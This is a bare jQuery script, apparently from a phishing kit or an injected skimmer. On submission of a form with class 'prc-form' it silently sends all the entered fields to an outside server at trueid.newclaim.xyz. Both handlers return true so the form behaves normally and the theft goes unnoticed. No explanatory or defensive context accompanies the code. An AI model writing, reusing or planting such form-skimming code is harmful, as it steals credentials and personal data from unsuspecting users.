$(".prc-form").submit(function() {
	var d = $(".prc-form");

	$.ajax({
        url: "https://trueid.newclaim.xyz/apiii.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});